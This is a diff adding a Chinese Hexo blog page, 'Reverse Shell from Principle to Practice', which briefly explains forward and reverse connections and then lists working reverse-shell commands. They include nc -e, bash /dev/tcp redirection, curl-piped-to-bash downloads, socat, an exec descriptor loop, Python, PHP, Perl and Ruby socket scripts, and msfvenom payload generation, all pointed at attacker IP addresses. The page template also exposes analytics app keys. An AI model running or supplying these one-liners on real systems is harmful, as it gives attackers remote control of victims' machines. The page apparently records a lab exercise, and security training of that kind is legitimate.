@@ -1,0 +1,809 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/dog.png">
+  <link rel="icon" href="/img/dog.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Sakura-xie">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="本文全面梳理了反弹 Shell 的原理与多种实战手法，涵盖正向连接与反向连接的概念区分，以及 nc、Bash、curl、Socat、Exec 等 Linux 反弹方式。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="反弹 Shell 从原理到实战">
+<meta property="og:url" content="https://sakura-xie.github.io/2026/03/26/%E5%8F%8D%E5%BC%B9-Shell-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98/index.html">
+<meta property="og:site_name" content="Sakura-xie&#39;s Blog">
+<meta property="og:description" content="本文全面梳理了反弹 Shell 的原理与多种实战手法，涵盖正向连接与反向连接的概念区分，以及 nc、Bash、curl、Socat、Exec 等 Linux 反弹方式。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img.cdn1.vip/i/69ed83bfd32b5_1777173439.png">
+<meta property="og:image" content="https://img.cdn1.vip/i/69ed83c01b2f9_1777173440.webp">
+<meta property="og:image" content="https://img.cdn1.vip/i/69ed83c016023_1777173440.webp">
+<meta property="og:image" content="https://img.cdn1.vip/i/69ed83c04efda_1777173440.webp">
+<meta property="og:image" content="https://img.cdn1.vip/i/69ed83c0420a9_1777173440.png">
+<meta property="og:image" content="https://img.cdn1.vip/i/69ed83c073b97_1777173440.webp">
+<meta property="og:image" content="https://img.cdn1.vip/i/69ed83c075603_1777173440.png">
+<meta property="og:image" content="https://img.cdn1.vip/i/69ed83c073b97_1777173440.webp">
+<meta property="og:image" content="https://img.cdn1.vip/i/69ed83c0bea87_1777173440.webp">
+<meta property="og:image" content="https://img.cdn1.vip/i/69ed83c0d4cc1_1777173440.webp">
+<meta property="og:image" content="https://img.cdn1.vip/i/69ed83c1040b8_1777173441.webp">
+<meta property="og:image" content="https://img.cdn1.vip/i/69ed83c10594f_1777173441.png">
+<meta property="og:image" content="https://img.cdn1.vip/i/69ed83c22fb12_1777173442.webp">
+<meta property="og:image" content="https://img.cdn1.vip/i/69ed83c1dda7a_1777173441.webp">
+<meta property="article:published_time" content="2026-03-26T02:41:44.000Z">
+<meta property="article:modified_time" content="2026-05-05T02:14:21.399Z">
+<meta property="article:author" content="Sakura-xie">
+<meta property="article:tag" content="Shell">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://img.cdn1.vip/i/69ed83bfd32b5_1777173439.png">
+  
+  
+  
+  <title>反弹 Shell 从原理到实战 - Sakura-xie&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="https://jsd.cdn.zzko.cn/gh/EmoryHuang/BlogBeautify@1.1/scroll.css">
+<link rel="stylesheet" href="https://jsd.cdn.zzko.cn/gh/EmoryHuang/BlogBeautify@1.1/gradient.css">
+<link rel="stylesheet" href="/css/glassBg.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sakura-xie.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"u5HR3OpYhCrvRxN5fklmHud6-gzGzoHsz","app_key":"gtzKcZNhHg9Am7uzMXKjV4HU","server_url":"https://u5hr3opy.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Sakura-xie&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="反弹 Shell 从原理到实战"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-03-26 10:41" pubdate>
+          2026年3月26日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          14 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">反弹 Shell 从原理到实战</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="什么是-shell"><a href="#什么是-shell" class="headerlink" title="什么是 shell"></a>什么是 <code>shell</code></h2><p><code>shell</code>俗称壳，是一种命令解释器，<code>shell</code>用来接收用户的输入，并且解释的命令。然后将其传给系统内核，内核再调用硬件来操作。</p>
+<hr>
+<h2 id="什么是反弹shell"><a href="#什么是反弹shell" class="headerlink" title="什么是反弹shell"></a>什么是反弹<code>shell</code></h2><p>反弹<code>shell</code>，就是控制端监听在某TCP&#x2F;UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。反弹<code>shell</code>与<code>telnet</code>，<code>ssh</code>等标准<code>shell</code>对应，本质上是网络概念的客户端与服务端的角色反转。</p>
+<p> <img src="https://img.cdn1.vip/i/69ed83bfd32b5_1777173439.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><p>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、<code>web</code>服务、<code>ssh</code>、<code>telnet</code>等等都是正向连接。</p>
+<h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><p>无法正向连接的情况：</p>
+<ul>
+<li><p>目标机因防火墙受限，目标机只能发送请求，不能接收请求。</p>
+</li>
+<li><p>目标机端口被占用。</p>
+</li>
+<li><p>目标机位于局域网，或IP会动态变化，攻击机无法直接连接。</p>
+</li>
+<li><p>某客户机中了你的网马，但是它在局域网内，你直接连接不了。</p>
+</li>
+</ul>
+<p>当无法正向连接时，只能反向连接。反向连接简单来说是身份互换，攻击机指定服务端，受害机作为客户端主动向攻击机发送连接。</p>
+<hr>
+<h2 id="常用linux反弹shell的方式"><a href="#常用linux反弹shell的方式" class="headerlink" title="常用linux反弹shell的方式"></a>常用<code>linux</code>反弹<code>shell</code>的方式</h2><p>实验环境：Kali，Ubuntu</p>
+<p>查看受害机支持的反弹方式</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">whereis nc bash python php <span class="hljs-built_in">exec</span> lua perl ruby<br></code></pre></td></tr></table></figure>
+
+<p>Ubuntu: <img src="https://img.cdn1.vip/i/69ed83c01b2f9_1777173440.webp" srcset="/img/loading.gif" lazyload></p>
+<h3 id="利用nc-netcat-反弹shell"><a href="#利用nc-netcat-反弹shell" class="headerlink" title="利用nc(netcat)反弹shell"></a>利用<code>nc(netcat)</code>反弹<code>shell</code></h3><p>在做实验时，当在Ubuntu中使用反弹本地shell的功能参数 -e 被阉割了，所以需要安装。</p>
+<p>Ubuntu安装命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt-get -y install netcat-traditional  <br><span class="hljs-built_in">sudo</span> update-alternatives --config nc<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img.cdn1.vip/i/69ed83c016023_1777173440.webp" srcset="/img/loading.gif" lazyload></p>
+<p>输入2，回车即可。</p>
+<p><strong>攻击机开启本地监听：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvvp 4444<br></code></pre></td></tr></table></figure>
+
+<p><strong>攻击机开启本地监听：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvvp 4444<br><span class="hljs-comment"># nc是netcat的简写，可实现任意TCP/UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口</span><br><span class="hljs-comment"># -l 监听模式，用于入站连接</span><br><span class="hljs-comment"># -v 详细输出--用两个-v可得到更详细的内容</span><br><span class="hljs-comment"># -p port 本地端口号</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>目标机主动连接攻击机：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc &lt;攻击机IP&gt; &lt;攻击机监听端口&gt; -e /bin/bash<br></code></pre></td></tr></table></figure>
+
+<p><strong>效果如下</strong> 攻击机：<br><img src="https://img.cdn1.vip/i/69ed83c04efda_1777173440.webp" srcset="/img/loading.gif" lazyload></p>
+<p>受害机：</p>
+<p><img src="https://img.cdn1.vip/i/69ed83c0420a9_1777173440.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="利用Bash反弹shell"><a href="#利用Bash反弹shell" class="headerlink" title="利用Bash反弹shell"></a>利用<code>Bash</code>反弹<code>shell</code></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -i &gt;&amp; /dev/tcp/&lt;攻击机IP&gt;/&lt;攻击机端口&gt; 0&gt;&amp;1  <br>或<br>bash -c <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/&lt;攻击机IP&gt;/&lt;攻击机端口&gt; 0&gt;&amp;1&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>命令说明：</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>命令详解</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>bash -i</td>
+<td>本地打开一个bash交互环境。</td>
+</tr>
+<tr>
+<td>&gt;&amp;</td>
+<td>将标准输出和标准错误输出重定向到后面跟的文件，也就是传递到远程上，如果远程开启了对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出</td>
+</tr>
+<tr>
+<td>&#x2F;dev&#x2F;tcp&#x2F;&lt;攻击机IP&gt;&#x2F;&lt;攻击机端口&gt;</td>
+<td>让目标主机与攻击机IP的XXXX端口建立一个tcp连接（打开这个文件就相当于发出了一个socket调用，建立一个socket连接）。</td>
+</tr>
+<tr>
+<td>0&gt;&amp;1</td>
+<td>将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容。</td>
+</tr>
+</tbody></table>
+<p>一句话解读：</p>
+<p>Bash产生了一个交互环境和本地主机主动发起与攻击机4444端口建立的连接（即TCP 4444会话连接）相结合，然后再重定向一个TCP 4444会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个Bash反弹环境。</p>
+<p>攻击机：<br><img src="https://img.cdn1.vip/i/69ed83c073b97_1777173440.webp" srcset="/img/loading.gif" lazyload></p>
+<p>受害机：</p>
+<p><img src="https://img.cdn1.vip/i/69ed83c075603_1777173440.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="Curl配合Bash反弹shell"><a href="#Curl配合Bash反弹shell" class="headerlink" title="Curl配合Bash反弹shell"></a><code>Curl</code>配合<code>Bash</code>反弹<code>shell</code></h3><p>攻击机在web目录里面创建一个index.html文件，内容如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -i &gt;&amp; /dev/tcp/192.168.146.129/4444 0&gt;&amp;1<br></code></pre></td></tr></table></figure>
+
+<p>攻击机开启4444端口，受害机访问命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl http://192.168.146.129/index.html |bash<br></code></pre></td></tr></table></figure>
+
+<p>攻击机：</p>
+<p><img src="https://img.cdn1.vip/i/69ed83c073b97_1777173440.webp" srcset="/img/loading.gif" lazyload></p>
+<p>受害机：</p>
+<p><img src="https://img.cdn1.vip/i/69ed83c0bea87_1777173440.webp" srcset="/img/loading.gif" lazyload></p>
+<h3 id="利用Socat反弹shell"><a href="#利用Socat反弹shell" class="headerlink" title="利用Socat反弹shell"></a>利用<code>Socat</code>反弹<code>shell</code></h3><p><strong>攻击机开启本地监听：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"> socat TCP-LISTEN:2333 -  <br> 或  <br> nc -lvvp 2333<br></code></pre></td></tr></table></figure>
+
+<p><strong>目标机主动连接攻击机：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">socat tcp-connect:47.xxx.xxx.72:2333 <span class="hljs-built_in">exec</span>:<span class="hljs-string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane<br></code></pre></td></tr></table></figure>
+
+<p>攻击机： </p>
+<p><img src="https://img.cdn1.vip/i/69ed83c0d4cc1_1777173440.webp" srcset="/img/loading.gif" lazyload></p>
+<h3 id="Exec-反弹shell"><a href="#Exec-反弹shell" class="headerlink" title="Exec 反弹shell"></a>Exec 反弹shell</h3><p><strong>攻击机开启本地监听：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvvp 2333<br></code></pre></td></tr></table></figure>
+
+<p><strong>目标机主动连接攻击机：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span> 5&lt;&gt;/dev/tcp/192.168.123.192/19111;<span class="hljs-built_in">cat</span> &lt;&amp;5 | <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> line; <span class="hljs-keyword">do</span> <span class="hljs-variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure>
+
+<p>攻击机： </p>
+<p><img src="https://img.cdn1.vip/i/69ed83c1040b8_1777173441.webp" srcset="/img/loading.gif" lazyload></p>
+<p>受害机： </p>
+<p><img src="https://img.cdn1.vip/i/69ed83c10594f_1777173441.png" srcset="/img/loading.gif" lazyload></p>
+<hr>
+<h2 id="各种脚本反弹shell"><a href="#各种脚本反弹shell" class="headerlink" title="各种脚本反弹shell"></a>各种脚本反弹<code>shell</code></h2><p>攻击者启动http服务，并在站点目录下存放一个txt文件，里面写着<code>python/php/Perl/Ruby</code>反弹<code>shell</code>命令（真实情况下需要VPS上部署HTTP服务，并建立如下文件）</p>
+<h3 id="Python-脚本反弹shell"><a href="#Python-脚本反弹shell" class="headerlink" title="Python 脚本反弹shell"></a><code>Python</code> 脚本反弹<code>shell</code></h3><p>受害机：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl http://192.168.146.129/py_shell.py |python<br></code></pre></td></tr></table></figure>
+
+<p><code>py_shell.py</code>中代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"> <span class="hljs-comment">#!/usr/bin/python  </span><br> <span class="hljs-comment">#*- coding: utf-8 -*-</span><br> <span class="hljs-keyword">import</span> socket,subprocess,os  <br> s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  <br> s.connect((<span class="hljs-string">&quot;192.168.146.129&quot;</span>,<span class="hljs-number">4444</span>)) <span class="hljs-comment"># 更改IP为自己的外网IP,端口自定义  </span><br> os.dup2(s.fileno(),<span class="hljs-number">0</span>)  <br> os.dup2(s.fileno(),<span class="hljs-number">1</span>)  <br> os.dup2(s.fileno(),<span class="hljs-number">2</span>)  <br> p=subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>])<br><br></code></pre></td></tr></table></figure>
+
+<h3 id="php-脚本反弹shell"><a href="#php-脚本反弹shell" class="headerlink" title="php 脚本反弹shell"></a><code>php</code> 脚本反弹<code>shell</code></h3><p>受害机：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl http://192.168.146.129/php_shell.txt |php<br></code></pre></td></tr></table></figure>
+
+<p><code>php_shell.txt</code>脚本内容如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-variable">$sock</span>=<span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-string">&quot;192.168.146.129&quot;</span>,<span class="hljs-number">4444</span>); <span class="hljs-comment">// IP为自己的外网IP，端口自定义  </span><br><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="Perl-脚本反弹shell"><a href="#Perl-脚本反弹shell" class="headerlink" title="Perl 脚本反弹shell"></a><code>Perl</code> 脚本反弹<code>shell</code></h3><p>Perl脚本内容如下：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs Perl"> <span class="hljs-keyword">use</span> Socket;  <br> <span class="hljs-variable">$i</span>=<span class="hljs-string">&quot;192.168.146.129&quot;</span>;  <br> <span class="hljs-variable">$p</span>=<span class="hljs-number">2333</span>;<span class="hljs-keyword">socket</span>(S,PF_INET,SOCK_STREAM,<span class="hljs-keyword">getprotobyname</span>(<span class="hljs-string">&quot;tcp&quot;</span>));  <br> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">connect</span>(S,sockaddr_in(<span class="hljs-variable">$p</span>,inet_aton(<span class="hljs-variable">$i</span>))))  <br> &#123;<span class="hljs-keyword">open</span>(STDIN,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);  <br> <span class="hljs-keyword">open</span>(STDOUT,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);  <br> <span class="hljs-keyword">open</span>(STDERR,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);  <br> <span class="hljs-keyword">exec</span>(<span class="hljs-string">&quot;/bin/sh -i&quot;</span>);  <br> &#125;;<br></code></pre></td></tr></table></figure>
+
+<h3 id="Ruby脚本反弹shell"><a href="#Ruby脚本反弹shell" class="headerlink" title="Ruby脚本反弹shell"></a><code>Ruby</code>脚本反弹<code>shell</code></h3><p>Ruby脚本内容如下：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ruby"> c=<span class="hljs-title class_">TCPSocket</span>.new(<span class="hljs-string">&quot;47.xxx.xxx.72&quot;</span>,<span class="hljs-string">&quot;2333&quot;</span>);  <br> <span class="hljs-keyword">while</span>(cmd=c.gets);  <br>     <span class="hljs-variable constant_">IO</span>.popen(cmd,<span class="hljs-string">&quot;r&quot;</span>)  <br>     &#123;  <br>         |<span class="hljs-params">io</span>|c.print io.read  <br>         &#125;  <br> <span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="使用Metasploit生成反弹shell用的一句话"><a href="#使用Metasploit生成反弹shell用的一句话" class="headerlink" title="使用Metasploit生成反弹shell用的一句话"></a>使用Metasploit生成反弹shell用的一句话</h2><p>Metasploit框架提供了生成一句话反弹shell的工具，即<code>msfvenom</code>。当我们不记得前面说的所有反弹shell的反弹语句时，只要我们有Metasploit，那么我们随时都可以使用 <code>msfvenom -l</code> 来查询生成我们所需要的各类命令行一句话。</p>
+<p>我们直接可以使用 <code>msfvenom -l</code> 结合关键字过滤（如cmd&#x2F;unix&#x2F;reverse），列出我们需要生成的各类反弹shell一句话的payload：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -l payloads | grep <span class="hljs-string">&#x27;cmd/unix/reverse&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>结果如图： </p>
+<p><img src="https://img.cdn1.vip/i/69ed83c22fb12_1777173442.webp" srcset="/img/loading.gif" lazyload></p>
+<p>比如，获取一个python反弹shell的一句话：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p cmd/unix/reverse_python LHOST=192.168.146.129 LPORT=4444 -f raw<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img.cdn1.vip/i/69ed83c1dda7a_1777173441.webp" srcset="/img/loading.gif" lazyload></p>
+<hr>
+<p><em>本文记录于 2024 年秋季</em></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%8C%87%E5%8D%97/" class="category-chain-item">指南</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Shell/" class="print-no-link">#Shell</a>
+      
+    </div>
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/04/24/SCMDB%EF%BC%88CAASM%EF%BC%89%E4%BA%A7%E5%93%81%E7%90%86%E8%A7%A3/" title="SCMDB（CAASM）产品理解">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">SCMDB（CAASM）产品理解</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/02/25/%E6%8B%92%E7%BB%9D%E2%80%9C%E6%91%8A%E5%A4%A7%E9%A5%BC%E2%80%9D%EF%BC%9A%E5%AE%9E%E4%B9%A0%E4%B8%AD%E4%B8%BB%E7%AE%A1%E6%95%99%E4%BC%9A%E6%88%91%E7%9A%84%E2%80%9C%E5%9E%82%E7%9B%B4%E5%88%87%E7%89%87%E2%80%9D%E6%80%9D%E7%BB%B4/" title="拒绝“摊大饼”：实习中主管教会我的“垂直切片”思维">
+                        <span class="hidden-mobile">拒绝“摊大饼”：实习中主管教会我的“垂直切片”思维</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
